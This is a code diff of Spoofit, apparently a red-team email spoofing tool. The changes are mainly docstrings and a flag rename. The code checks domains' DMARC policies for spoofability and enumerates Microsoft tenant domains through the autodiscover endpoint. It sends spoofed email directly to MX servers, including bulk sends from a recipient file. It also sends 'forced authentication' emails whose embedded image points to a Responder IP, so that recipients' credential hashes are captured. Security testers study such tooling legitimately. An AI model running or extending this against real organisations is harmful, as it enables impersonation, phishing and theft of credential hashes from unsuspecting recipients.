@@ -34,6 +34,9 @@ def get_mx_record(domain):
         return None
 
 def send_email(mx_record, sender, recipient, subject, body):
+    """
+    Attempts direct-to-MX delivery of an email. 
+    """
     try:
         with smtplib.SMTP(mx_record, 25) as server:
             server.ehlo_or_helo_if_needed()
@@ -55,11 +58,17 @@ def send_email(mx_record, sender, recipient, subject, body):
         print(f"[!] Error sending email to {recipient}: {e}")
 
 def load_config(forced=False):
+    """
+    Loads configuration from 'conf/spoofit.conf'.
+    If forced=True, loads forced authentication subject/body.
+    Otherwise loads standard spoof email subject/body.
+    """
     config = configparser.ConfigParser()
     config_file = 'conf/spoofit.conf'
     if not os.path.exists(config_file):
         print(f"[!] Configuration file {config_file} does not exist.")
         return None
+
     config.read(config_file)
     if forced:
         subject = config.get('ForcedAuthEmail', 'subject')
@@ -72,12 +81,14 @@ def load_config(forced=False):
     return subject, body
 
 def create_forced_auth_email(body_template, responder_ip):
+    """
+    Inserts the responder IP into the forced auth email body template.
+    """
     return body_template % {'responder': responder_ip}
 
 def is_subdomain(domain):
     """
-    Returns True if 'domain' is a subdomain
-    (meaning it is NOT the organizational domain itself).
+    Returns True if 'domain' is a subdomain of the organizational domain.
     """
     extracted = tldextract.extract(domain)
     org_domain = f"{extracted.domain}.{extracted.suffix}"
@@ -85,8 +96,9 @@ def is_subdomain(domain):
 
 def check_spoofability(domain):
     """
-    Checks if 'domain' is spoofable based on DMARC records.
-    Incorporates subdomain logic for sp= if subdomain has no DMARC.
+    Checks if 'domain' can be spoofed based on DMARC:
+    - If subdomain, checks sp= in org domain if no DMARC found locally.
+    - Prints color-coded lines and returns result dict.
     """
     RED = "\033[91m"
     GREEN = "\033[92m"
@@ -94,9 +106,7 @@ def check_spoofability(domain):
     RESET = "\033[0m"
 
     result = {"domain": domain, "policy": "", "spoofable": False}
-
     try:
-        # Try _dmarc.domain first
         try:
             dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
             dmarc_record = str(dmarc_answer[0]).lower()
@@ -124,18 +134,14 @@ def check_spoofability(domain):
                 result["spoofable"] = True
 
         else:
-            # No DMARC. Check if subdomain
             extracted = tldextract.extract(domain)
             org_domain = f"{extracted.domain}.{extracted.suffix}"
-
             if org_domain.lower() == domain.lower():
-                # Not actually a subdomain => no DMARC => spoofable
                 print(f"{YELLOW}[!] No DMARC for {domain}.{RESET}")
                 print(f"{GREEN}[+] Spoofing possible — no policy.{RESET}")
                 result["policy"] = "No record"
                 result["spoofable"] = True
             else:
-                # Subdomain => check sp= in org domain's DMARC
                 try:
                     org_dmarc = dns.resolver.resolve(f"_dmarc.{org_domain}", "TXT")
                     org_record = str(org_dmarc[0]).lower()
@@ -186,14 +192,18 @@ def check_spoofability(domain):
 
 def autodiscover_endpoint(domain):
     """
-    If domain ends with .gov, use https://autodiscover-s.office365.us/autodiscover/autodiscover.svc
-    otherwise default to https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
+    If domain ends with .gov, uses https://autodiscover-s.office365.us/autodiscover/autodiscover.svc
+    otherwise uses https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
     """
     if domain.lower().endswith(".gov"):
         return "https://autodiscover-s.office365.us/autodiscover/autodiscover.svc"
     return "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"
 
 def enumerate_tenant_domains(domain):
+    """
+    Attempts to retrieve all accepted domains in the tenant, 
+    using the correct autodiscover endpoint for .gov or standard tenant.
+    """
     body = f"""<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages"
         xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types"
@@ -248,6 +258,10 @@ def enumerate_tenant_domains(domain):
     return list(set(domains_found))
 
 def print_summary_table(dmarc_results):
+    """
+    Prints a color-coded summary of DMARC policies and spoofability
+    (excluding .onmicrosoft.com domains).
+    """
     GREEN = "\033[92m"
     YELLOW = "\033[93m"
     RESET = "\033[0m"
@@ -268,10 +282,8 @@ def print_summary_table(dmarc_results):
 
         if res["spoofable"]:
             if "quarantine" in policy.lower():
-                # If domain is quarantined
                 spoof_str = "Doubtful"
             else:
-                # If domain is a subdomain
                 if is_subdomain(domain):
                     spoof_str = f"{YELLOW}Maybe{RESET}"
                 else:
@@ -283,6 +295,9 @@ def print_summary_table(dmarc_results):
     print("-" * 100 + "\n")
 
 def export_results_csv(dmarc_results, filename):
+    """
+    Exports the DMARC results to a CSV file, skipping .onmicrosoft.com domains.
+    """
     filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
     if not filtered:
         print(f"[!] No results to export to {filename} (all onmicrosoft?).")
@@ -310,6 +325,10 @@ def export_results_csv(dmarc_results, filename):
         print(f"[!] Error exporting to {filename}: {e}")
 
 def parse_tenant_name(domains, fallback_domain):
+    """
+    Determines the name for CSV file by parsing any .onmicrosoft.com domain
+    or falling back to the domain name.
+    """
     onmicrosoft = [d for d in domains if d.lower().endswith(".onmicrosoft.com")]
     if onmicrosoft:
         raw = onmicrosoft[0].lower()
@@ -325,50 +344,56 @@ def main():
         description="DMARC-Focused Email Spoofing Tool.",
         epilog="""
 Examples:
+
   1) Check domain:
-     Spoofit.py -c example.com
+     Spoofit.py -d domain.com
 
   2) Check entire tenant (auto-saves CSV):
-     Spoofit.py -c example.com -t
+     Spoofit.py -d domain.com -t
 
-  3) Send spoofed email:
-     Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or file.txt>
+  3) Send a spoofed email (single recipient):
+     Spoofit.py -s sender@domain.com -r recipient@domain.com
 
-  4) Forced-auth:
-     Spoofit.py -s <sender@domain.com> -r <recipient@domain.com> -f <responder-ip>
+  4) Send a spoofed email (multiple recipients from file):
+     Spoofit.py -s sender@domain.com -r recipients.txt
+
+  5) Forced authentication:
+     Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder-ip
         """,
         formatter_class=argparse.RawTextHelpFormatter
     )
 
-    parser.add_argument('-c', '--check', help='Check spoofability for a domain.')
+    parser.add_argument('-d', '--domain', help='Check spoofability for a domain.')
     parser.add_argument('-t', '--tenant', action='store_true', help='Check entire Microsoft tenant.')
     parser.add_argument('-s', '--sender', help='Spoofed sender email.')
-    parser.add_argument('-r', '--recipients', help='Recipient email or file.')
-    parser.add_argument('-f', '--forced', help='Forced auth email with Responder IP.')
+    parser.add_argument('-r', '--recipients', help='Recipient email or file containing list of recipient emails.')
+    parser.add_argument('-f', '--forced', metavar='RESPONDER_IP',
+                        help='Send email with embedded image pointing to Responder.')
 
     args = parser.parse_args()
     if not any(vars(args).values()):
         parser.print_help()
         return
 
-    if args.check:
+    # 1) Domain check logic (DMARC checks)
+    if args.domain:
         dmarc_results = []
-        domains_to_check = [args.check]
+        domains_to_check = [args.domain]
 
         if args.tenant:
-            all_domains = enumerate_tenant_domains(args.check)
-            csv_filename = parse_tenant_name(all_domains, args.check)
+            all_domains = enumerate_tenant_domains(args.domain)
+            csv_filename = parse_tenant_name(all_domains, args.domain)
             tenant_domains = [d for d in all_domains if not d.lower().endswith(".onmicrosoft.com")]
             if tenant_domains:
-                print(f"[+] Tenant domains discovered for {args.check} (excluding .onmicrosoft.com):")
+                print(f"[+] Tenant domains discovered for {args.domain} (excluding .onmicrosoft.com):")
                 for dom in tenant_domains:
                     print(f"  - {dom}")
                 print("\nRunning DMARC checks on each discovered domain:\n")
                 domains_to_check = tenant_domains
             else:
                 print("[-] No additional tenant domains found or all .onmicrosoft.com.")
-                print(f"Checking only {args.check}.\n")
-                csv_filename = parse_tenant_name([], args.check)
+                print(f"Checking only {args.domain}.\n")
+                csv_filename = parse_tenant_name([], args.domain)
 
         for dom in domains_to_check:
             res = check_spoofability(dom)
@@ -380,6 +405,7 @@ Examples:
             export_results_csv(dmarc_results, csv_filename)
         return
 
+    # 2) Sending spoofed emails
     if args.recipients and args.sender:
         recipients = []
         if os.path.isfile(args.recipients):
@@ -394,7 +420,7 @@ Examples:
                 return
             subject, body_template = cfg
             body = create_forced_auth_email(body_template, args.forced)
-            print(f"[*] Sending forced auth email to {len(recipients)} recipients.")
+            print(f"[*] Sending forced authentication email to {len(recipients)} recipients.")
         else:
             cfg = load_config()
             if not cfg:
